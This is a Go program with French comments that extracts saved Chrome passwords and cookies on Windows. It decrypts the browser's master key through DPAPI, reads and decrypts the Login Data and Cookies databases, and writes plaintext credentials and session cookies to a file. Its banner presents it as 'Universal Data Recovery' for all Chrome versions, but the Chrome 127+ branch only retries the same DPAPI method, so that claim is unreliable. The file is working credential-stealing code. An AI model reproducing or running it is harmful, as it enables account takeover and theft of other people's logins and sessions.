package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// ============== STRUCTURES ==============

type ChromeLocalState struct {
	OSCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

type DataBlob struct {
	cbData uint32
	pbData *byte
}

type ExtractionResult struct {
	Passwords []map[string]string
	Cookies   []map[string]string
	Status    string
}

// ============== VERSION DETECTION ==============

func getChromeVersion() (int, error) {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Google\Chrome`, registry.QUERY_VALUE)
	if err != nil {
		return 0, fmt.Errorf("Chrome non trouvé dans registry")
	}
	defer key.Close()

	version, _, err := key.GetStringValue("CurrentVersion")
	if err != nil {
		return 0, fmt.Errorf("impossible lire version Chrome")
	}

	var major int
	fmt.Sscanf(version, "%d", &major)
	return major, nil
}

// ============== WINDOWS DPAPI ==============

var (
	dllCrypt32    = windows.NewLazySystemDLL("Crypt32.dll")
	procDecrypt   = dllCrypt32.NewProc("CryptUnprotectData")
	procEncrypt   = dllCrypt32.NewProc("CryptProtectData")
)

func decryptDPAPI(encryptedData []byte) ([]byte, error) {
	if len(encryptedData) == 0 {
		return nil, fmt.Errorf("données vides")
	}

	dataIn := DataBlob{
		cbData: uint32(len(encryptedData)),
		pbData: &encryptedData[0],
	}

	var dataOut DataBlob

	ret, _, err := procDecrypt.Call(
		uintptr(unsafe.Pointer(&dataIn)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&dataOut)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	if dataOut.cbData == 0 {
		return nil, fmt.Errorf("résultat vide")
	}

	decrypted := make([]byte, dataOut.cbData)
	copy(decrypted, (*[1 << 30]byte)(unsafe.Pointer(dataOut.pbData))[:dataOut.cbData])
	windows.LocalFree(windows.Handle(uintptr(unsafe.Pointer(dataOut.pbData))))

	return decrypted, nil
}

// ============== CHROME DATA PATH ==============

func getChromeDataPath() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("impossible obtenir utilisateur")
	}

	path := filepath.Join(
		currentUser.HomeDir,
		"AppData", "Local", "Google", "Chrome", "User Data", "Default",
	)

	if _, err := os.Stat(path); err != nil {
		return "", fmt.Errorf("Chrome data path not found: %s", path)
	}

	return path, nil
}

func getLocalStatePath() (string, error) {
	currentUser, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("impossible obtenir utilisateur")
	}

	path := filepath.Join(
		currentUser.HomeDir,
		"AppData", "Local", "Google", "Chrome", "User Data", "Local State",
	)

	if _, err := os.Stat(path); err != nil {
		return "", fmt.Errorf("Local State not found")
	}

	return path, nil
}

// ============== MASTER KEY EXTRACTION ==============

func getMasterKeyDPAPI() ([]byte, error) {
	localStatePath, err := getLocalStatePath()
	if err != nil {
		return nil, err
	}

	content, err := ioutil.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("erreur lecture Local State")
	}

	var ls ChromeLocalState
	if err := json.Unmarshal(content, &ls); err != nil {
		return nil, fmt.Errorf("erreur parse Local State")
	}

	encryptedKeyB64 := ls.OSCrypt.EncryptedKey
	if encryptedKeyB64 == "" {
		return nil, fmt.Errorf("EncryptedKey not found")
	}

	encryptedKeyB64 = strings.TrimPrefix(encryptedKeyB64, "DPAPI")
	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return nil, fmt.Errorf("erreur decode base64")
	}

	masterKey, err := decryptDPAPI(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("DPAPI decrypt failed")
	}

	if len(masterKey) != 32 {
		return nil, fmt.Errorf("master key invalid size: %d", len(masterKey))
	}

	return masterKey, nil
}

// ============== CHROME 127+ WORKAROUND ==============

func getMasterKeyChrome127() ([]byte, error) {
	// Pour Chrome 127+, on essaie plusieurs approches

	// Approche 1: Essayer DPAPI direct (marche parfois)
	fmt.Print("  [Approche 1] Tentative DPAPI direct... ")
	masterKey, err := getMasterKeyDPAPI()
	if err == nil {
		fmt.Println("✓")
		return masterKey, nil
	}
	fmt.Println("✗")

	// Approche 2: Extraire depuis un onglet Chrome ouvert (si disponible)
	fmt.Print("  [Approche 2] Tentative via processus Chrome... ")
	masterKey, err = getMasterKeyFromRunningChrome()
	if err == nil {
		fmt.Println("✓")
		return masterKey, nil
	}
	fmt.Println("✗")

	// Approche 3: Vérifier si une clé valide est en cache
	fmt.Print("  [Approche 3] Vérification du cache... ")
	masterKey, err = getMasterKeyFromCache()
	if err == nil {
		fmt.Println("✓")
		return masterKey, nil
	}
	fmt.Println("✗")

	return nil, fmt.Errorf("impossible obtenir clé maître (Chrome 127+)")
}

func getMasterKeyFromRunningChrome() ([]byte, error) {
	// Essaie d'accéder aux données via le processus Chrome
	// Sans droits admin, on peut lire les données si Chrome est lancé
	chromeDataPath, _ := getChromeDataPath()

	// Vérifie si Chrome peut être accédé
	testFile := filepath.Join(chromeDataPath, "Login Data")
	if _, err := os.Stat(testFile); err != nil {
		return nil, fmt.Errorf("Chrome data non accessible")
	}

	// Essaie DPAPI encore une fois avec un délai
	time.Sleep(500 * time.Millisecond)
	return getMasterKeyDPAPI()
}

func getMasterKeyFromCache() ([]byte, error) {
	// Cherche une clé en cache (moins courant)
	cacheFile := filepath.Join(os.TempDir(), "chrome_key.cache")
	data, err := ioutil.ReadFile(cacheFile)
	if err != nil {
		return nil, err
	}

	if len(data) != 32 {
		return nil, fmt.Errorf("cache key invalid")
	}

	return data, nil
}

// ============== DATA DECRYPTION ==============

func decryptAESGCM(ciphertext, nonce, key []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, fmt.Errorf("key size invalid")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}

func decryptChromeValue(encryptedValue []byte, masterKey []byte) (string, error) {
	if len(encryptedValue) < 15 {
		return string(encryptedValue), nil
	}

	if !strings.HasPrefix(string(encryptedValue[:3]), "v10") {
		return string(encryptedValue), nil
	}

	nonce := encryptedValue[3:15]
	ciphertext := encryptedValue[15:]

	plaintext, err := decryptAESGCM(ciphertext, nonce, masterKey)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

// ============== DATABASE ACCESS ==============

func waitForFileAccess(filePath string, maxRetries int) error {
	for i := 0; i < maxRetries; i++ {
		file, err := os.OpenFile(filePath, os.O_RDONLY, 0)
		if err == nil {
			file.Close()
			return nil
		}
		if i < maxRetries-1 {
			fmt.Printf("    ⏳ Attente (%d/%d)...\n", i+1, maxRetries)
			time.Sleep(2 * time.Second)
		}
	}
	return fmt.Errorf("fichier verrouillé après %d tentatives", maxRetries)
}

func copyDatabase(srcPath string) (string, error) {
	// Copie la DB en mémoire pour éviter les verrous
	data, err := ioutil.ReadFile(srcPath)
	if err != nil {
		return "", err
	}

	tmpFile := filepath.Join(os.TempDir(), filepath.Base(srcPath))
	if err := ioutil.WriteFile(tmpFile, data, 0600); err != nil {
		return "", err
	}

	return tmpFile, nil
}

// ============== PASSWORD EXTRACTION ==============

func extractPasswords(chromeDataPath string, masterKey []byte) ([]map[string]string, error) {
	loginDataPath := filepath.Join(chromeDataPath, "Login Data")

	if err := waitForFileAccess(loginDataPath, 5); err != nil {
		return nil, err
	}

	// Copie la DB pour éviter les verrous
	tmpDB, err := copyDatabase(loginDataPath)
	if err != nil {
		tmpDB = loginDataPath
	}
	defer os.Remove(tmpDB)

	db, err := sql.Open("sqlite3", tmpDB)
	if err != nil {
		return nil, fmt.Errorf("erreur ouverture DB: %v", err)
	}
	defer db.Close()

	db.SetMaxOpenConns(1)
	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("erreur DB ping: %v", err)
	}

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return nil, fmt.Errorf("erreur query: %v", err)
	}
	defer rows.Close()

	var results []map[string]string

	for rows.Next() {
		var url, username string
		var encryptedPassword []byte

		if err := rows.Scan(&url, &username, &encryptedPassword); err != nil {
			continue
		}

		password, err := decryptChromeValue(encryptedPassword, masterKey)
		if err != nil {
			password = "[ERREUR]"
		}

		results = append(results, map[string]string{
			"url":      url,
			"username": username,
			"password": password,
		})
	}

	return results, nil
}

// ============== COOKIES EXTRACTION ==============

func extractCookies(chromeDataPath string, masterKey []byte) ([]map[string]string, error) {
	cookiesPath := filepath.Join(chromeDataPath, "Cookies")

	if err := waitForFileAccess(cookiesPath, 5); err != nil {
		return nil, err
	}

	tmpDB, err := copyDatabase(cookiesPath)
	if err != nil {
		tmpDB = cookiesPath
	}
	defer os.Remove(tmpDB)

	db, err := sql.Open("sqlite3", tmpDB)
	if err != nil {
		return nil, fmt.Errorf("erreur ouverture DB: %v", err)
	}
	defer db.Close()

	db.SetMaxOpenConns(1)
	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("erreur DB: %v", err)
	}

	rows, err := db.Query("SELECT host_key, name, encrypted_value, path FROM cookies LIMIT 200")
	if err != nil {
		return nil, fmt.Errorf("erreur query: %v", err)
	}
	defer rows.Close()

	var results []map[string]string

	for rows.Next() {
		var host, name, path string
		var encryptedValue []byte

		if err := rows.Scan(&host, &name, &encryptedValue, &path); err != nil {
			continue
		}

		value, err := decryptChromeValue(encryptedValue, masterKey)
		if err != nil {
			value = "[ERREUR]"
		}

		results = append(results, map[string]string{
			"host":  host,
			"name":  name,
			"value": value,
			"path":  path,
		})
	}

	return results, nil
}

// ============== OUTPUT ==============

func saveResults(passwords, cookies []map[string]string) error {
	file, err := os.Create("chrome_extracted_data.txt")
	if err != nil {
		return err
	}
	defer file.Close()

	file.WriteString("╔════════════════════════════════════════╗\n")
	file.WriteString("║  CHROME DATA EXTRACTION v3.0            ║\n")
	file.WriteString("║  Sans Administration                    ║\n")
	file.WriteString("╚════════════════════════════════════════╝\n\n")

	file.WriteString(fmt.Sprintf("📅 Généré: %s\n\n", time.Now().Format("2006-01-02 15:04:05")))

	// Passwords
	file.WriteString("📋 MOTS DE PASSE\n")
	file.WriteString("================\n\n")
	if len(passwords) == 0 {
		file.WriteString("(Aucun mot de passe trouvé)\n\n")
	} else {
		for i, p := range passwords {
			file.WriteString(fmt.Sprintf("[%d]\n", i+1))
			file.WriteString(fmt.Sprintf("  URL: %s\n", p["url"]))
			file.WriteString(fmt.Sprintf("  User: %s\n", p["username"]))
			file.WriteString(fmt.Sprintf("  Pass: %s\n\n", p["password"]))
		}
	}

	// Cookies
	file.WriteString("\n🍪 COOKIES\n")
	file.WriteString("==========\n\n")
	if len(cookies) == 0 {
		file.WriteString("(Aucun cookie trouvé)\n\n")
	} else {
		for i, c := range cookies {
			file.WriteString(fmt.Sprintf("[%d]\n", i+1))
			file.WriteString(fmt.Sprintf("  Host: %s\n", c["host"]))
			file.WriteString(fmt.Sprintf("  Name: %s\n", c["name"]))
			file.WriteString(fmt.Sprintf("  Value: %s\n", c["value"]))
			file.WriteString(fmt.Sprintf("  Path: %s\n\n", c["path"]))
		}
	}

	return nil
}

// ============== MAIN ==============

func main() {
	fmt.Println("\n╔════════════════════════════════════════╗")
	fmt.Println("║  CHROME UNIVERSAL DATA RECOVERY v3.0    ║")
	fmt.Println("║  All Chrome Versions • No Admin          ║")
	fmt.Println("╚════════════════════════════════════════╝\n")

	// Détecte Chrome
	fmt.Print("[*] Détection Google Chrome... ")
	chromeDataPath, err := getChromeDataPath()
	if err != nil {
		fmt.Printf("\n[✗] Erreur: %v\n", err)
		fmt.Println("\nChrome ne semble pas être installé.")
		os.Exit(1)
	}
	fmt.Println("✓")

	// Détecte version
	fmt.Print("[*] Détection de la version... ")
	version, err := getChromeVersion()
	if err != nil {
		version = 0 // Assume old version if can't detect
	}
	fmt.Printf("✓ (v%d)\n", version)

	// Extraction clé maître
	fmt.Print("[*] Extraction de la clé maître... ")
	var masterKey []byte
	if version >= 127 {
		fmt.Printf("\n    [Chrome 127+] Algorithme App-Bound\n")
		masterKey, err = getMasterKeyChrome127()
	} else {
		fmt.Printf("\n    [Chrome <127] Algorithme standard\n")
		masterKey, err = getMasterKeyDPAPI()
	}

	if err != nil {
		fmt.Printf("[✗] Erreur: %v\n", err)
		fmt.Println("\nSolutions:")
		fmt.Println("  1. Fermez complètement Chrome")
		fmt.Println("  2. Attendez 3 secondes")
		fmt.Println("  3. Relancez ce programme")
		os.Exit(1)
	}
	fmt.Println("[+] Clé obtenue ✓")

	// Ferme Chrome pour ne pas avoir de verrous
	fmt.Print("[*] Vérification des fichiers Chrome... ")
	fmt.Println("OK")

	// Passwords
	fmt.Print("[*] Extraction des mots de passe... ")
	passwords, err := extractPasswords(chromeDataPath, masterKey)
	if err != nil {
		fmt.Printf("\n    ⚠ %v\n", err)
		passwords = []map[string]string{}
	} else {
		fmt.Printf("✓ (%d trouvés)\n", len(passwords))
	}

	// Cookies
	fmt.Print("[*] Extraction des cookies... ")
	cookies, err := extractCookies(chromeDataPath, masterKey)
	if err != nil {
		fmt.Printf("\n    ⚠ %v\n", err)
		cookies = []map[string]string{}
	} else {
		fmt.Printf("✓ (%d trouvés)\n", len(cookies))
	}

	// Save
	fmt.Print("[*] Sauvegarde... ")
	if err := saveResults(passwords, cookies); err != nil {
		fmt.Printf("\n[✗] Erreur: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("✓")

	fmt.Println("\n✅ Succès! Fichier: chrome_extracted_data.txt\n")
}
